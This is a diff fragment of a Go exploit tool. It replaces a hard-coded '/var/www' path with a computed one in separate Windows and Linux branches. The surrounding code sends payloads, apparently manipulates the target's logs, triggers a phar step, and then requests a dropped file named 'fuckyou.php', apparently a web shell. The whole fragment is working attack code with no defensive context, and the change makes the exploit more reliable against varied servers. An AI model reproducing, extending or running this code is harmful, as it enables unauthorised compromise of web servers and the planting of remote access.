@@ -102,7 +102,7 @@ func main() {
 			fmt.Println("[*] system: windows")
 			if strings.Contains(sendpayloadforwindows(url1).Status, "500") {
 				if strings.Contains(filterlog(url1).Status, "200") {
-					if strings.Contains(phar(url1, "/var/www").Status, "500") {
+					if strings.Contains(phar(url1, path(url1)).Status, "500") {
 						time.Sleep(time.Second * 1)
 						rep1, err := http.Get(string(url) + "/fuckyou.php")
 						if err != nil {
@@ -120,7 +120,7 @@ func main() {
 			fmt.Println("[*] system: linux")
 			if strings.Contains(sendpayloadforlinux(url1).Status, "500") {
 				if strings.Contains(filterlog(url1).Status, "200") {
-					if strings.Contains(phar1(url1, "/var/www").Status, "500") {
+					if strings.Contains(phar1(url1, path(url1)).Status, "500") {
 						time.Sleep(time.Second * 1)
 						rep1, err := http.Get(string(url) + "/fuckyou.php")
 						if err != nil {
